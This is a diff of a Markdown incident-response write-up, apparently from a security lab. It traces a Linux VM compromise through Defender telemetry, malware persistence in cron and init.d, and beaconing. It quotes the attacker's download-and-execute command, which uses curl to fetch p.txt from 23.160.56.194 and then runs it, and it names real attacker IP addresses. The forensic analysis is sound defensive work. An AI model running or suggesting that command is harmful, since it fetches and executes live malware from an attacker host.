@@ -137,7 +137,7 @@ The successful `root` authentication observed during this investigation is attri
 
 ---
 
-### Student changes Root password
+### Student changes Root password | AHTKzAEv
 - Student begins the lab, changing root password to 'root'
    - `2026-01-30T13:50:32.826013Z` (1:50pm) — /etc/shadow edited by labuser via root (likely a password change)
    - `2026-01-30T14:02:04.257228Z` ~12 minutes later, first suspicious file `/var/tmp/AHTKzAEv` is created
@@ -166,6 +166,15 @@ DeviceFileEvents
 - Repeated FileCreated / FileDeleted events for x.sh and AHTKzAEv
    - This pattern suggests execution loops: run the script → collect data → delete temporary files → drop new scripts to continue
    - Deleting files is often to avoid forensic detection
+   - 
+```
+/var/tmp/AHTKzAEv          <- the malicious binary
+  └─ ygljglkjgfg0          <- child process / script spawned by AHTKzAEv
+       └─ owqtmtieus       <- reconnaissance or mining scripts spawned by ygljglkjgfg0
+
+```
+
+<img width="1035" height="393" alt="image" src="https://github.com/user-attachments/assets/dcc3a47c-84ca-4431-81ed-79a4bed88857" />
  
 ### Root Cron Persistence
 
@@ -207,13 +216,15 @@ SOURCE: DarkTrace blog
 
 <br>
 
-### ./ygljglkjgfg0
+### Malicious Binary Download p.txt ./ygljglkjgfg0
+
+<img width="1148" height="343" alt="image" src="https://github.com/user-attachments/assets/30eae789-719e-49e9-8338-21a71efeb701" />
 
 - `ygljglkjgfg0` appears
    - First seen at /usr/bin/ygljglkjgfg0
    - Downloaded via curl and wget from a remote host (23.160.56.194/p.txt)
    - Then copied to /etc/init.d/ygljglkjgfg0 and /etc/cron.hourly/gcc.sh
-- This is stage 1 payload deployment:
+- This is stage 1 payload deployment
    - /usr/bin copy = persistent executable
    - /etc/init.d = run at boot
    - /etc/cron.hourly = run every hour or as scheduled
@@ -221,11 +232,10 @@ SOURCE: DarkTrace blog
 - Stage 2 and replication
    - tdrbhhtkky copied from ygljglkjgfg0
    - omicykvmml copied from ygljglkjgfg0
-   - These are clones or secondary payloads, probably:
-Backdoors
-Miner binaries (if that was the intent)
-Remote control scripts
-
+- These are clones or secondary payloads
+   - Backdoors
+   - Miner binaries (if that was the intent)
+   - Remote control scripts
 - Randomized names (ygljglkjgfg0, ygljglkjgfg1, tdrbhhtkky, omicykvmml) = evade detection
 
 - Crontab modification
@@ -240,44 +250,37 @@ This ensures the malware executes every 3 minutes.
 This explains why cron is still active but “drowned out” — it’s being overwritten and hijacked by the malware.
 
 ✅ Key points from this activity
-
 Persistent scheduling: malware hijacks cron and cron.hourly.
-
 Multi-stage deployment: initial payload (ygljglkjgfg0) spawns additional binaries.
-
 Self-replication: copies itself to multiple locations for redundancy.
-
 Remote fetch: uses curl/wget to pull more binaries.
-
 Cleanup & rename: old cron temp files are renamed/removed to hide traces.
 
 <br>
 
-<img width="1148" height="343" alt="image" src="https://github.com/user-attachments/assets/30eae789-719e-49e9-8338-21a71efeb701" />
+<img width="1185" height="111" alt="image" src="https://github.com/user-attachments/assets/34ab995b-7b97-4eb8-9bc6-5828c76611c3" />
 
-<br>
+<img width="1280" height="647" alt="image" src="https://github.com/user-attachments/assets/987eede9-ed10-45ce-b751-6016c6f32762" />
 
----
+<img width="1280" height="644" alt="image" src="https://github.com/user-attachments/assets/37e734b4-a72d-4f33-ac52-817bbc5ea215" />
 
-### Malicious Binary Download Detected
 
-Defender for Endpoint file telemetry revealed suspicious binaries written directly to `/usr/bin`:
 
-```kql
-DeviceFileEvents  
-| where DeviceName == "linux-programmatic-fix-michael"  
-| where FileName startswith "ygljglkjgfg"  
-| project TimeGenerated, FileName, FolderPath, InitiatingProcessCommandLine  
-| order by TimeGenerated asc  
-```
+- Keep the same URL so all infected machines keep pulling the “latest version”
+- FileType: Elf (Executable and Linkable Format) even though it's named .txt
+   - Not actually a text file, but a compiled Linux binary
+   - Name file .txt to avoid suspicion
+   - Download → Rename → Execute 
 
-Observed artifacts included:
+- curl http://23.160.56.194/p.txt -o ygljglkjgfg0
+./ygljglkjgfg0
+   - p.txt = malicious ELF binary
+   - ygljglkjgfg0 = renamed executable copy
 
-- `ygljglkjgfg0`  
-- `ygljglkjgfg1`  
-- `ygljglkjgfg2`  
+<img width="1186" height="129" alt="image" src="https://github.com/user-attachments/assets/92235bb2-534f-4b07-b581-e0ae091b650f" />
 
-All were written within seconds of each other.
+23.160.56.194 > p.txt download
+<img width="1469" height="1026" alt="image" src="https://github.com/user-attachments/assets/048196ef-b444-4d7a-b47c-7378c44183f5" />
 
 ---
 
@@ -406,61 +409,6 @@ Microsoft Defender for Endpoint successfully detected the malicious activity, en
 
 
 ## Misc
-
-p.txt
-
-<img width="1185" height="111" alt="image" src="https://github.com/user-attachments/assets/34ab995b-7b97-4eb8-9bc6-5828c76611c3" />
-
-<img width="1280" height="647" alt="image" src="https://github.com/user-attachments/assets/987eede9-ed10-45ce-b751-6016c6f32762" />
-
-<img width="1280" height="644" alt="image" src="https://github.com/user-attachments/assets/37e734b4-a72d-4f33-ac52-817bbc5ea215" />
-
-
-
-Keep the same URL so all infected machines keep pulling the “latest version”
-
-FileType: ElfExecutable
-Even though it's named .txt.
-
-That means:
-
-It’s not actually a text file. It’s a compiled Linux binary.
-
-Classic attacker trick:
-
-Name file .txt to avoid suspicion
-
-Download it
-
-Rename it
-
-Execute it
-
-You saw exactly that behavior earlier with:
-
-curl http://23.160.56.194/p.txt -o ygljglkjgfg0
-./ygljglkjgfg0
-So:
-
-p.txt = malicious ELF binary
-ygljglkjgfg0 = renamed executable copy
-
-<img width="1186" height="129" alt="image" src="https://github.com/user-attachments/assets/92235bb2-534f-4b07-b581-e0ae091b650f" />
-
-
-AHTKzAEv
-```
-/var/tmp/AHTKzAEv          <- the malicious binary
-  └─ ygljglkjgfg0          <- child process / script spawned by AHTKzAEv
-       └─ owqtmtieus       <- reconnaissance or mining scripts spawned by ygljglkjgfg0
-```
-
-<img width="1035" height="393" alt="image" src="https://github.com/user-attachments/assets/dcc3a47c-84ca-4431-81ed-79a4bed88857" />
-
-
-
-23.160.56.194 > p.txt download
-<img width="1469" height="1026" alt="image" src="https://github.com/user-attachments/assets/048196ef-b444-4d7a-b47c-7378c44183f5" />
 
 109.206.236.18
 Beaconing = the infected machine initiating an outbound connection to an attacker-controlled server.
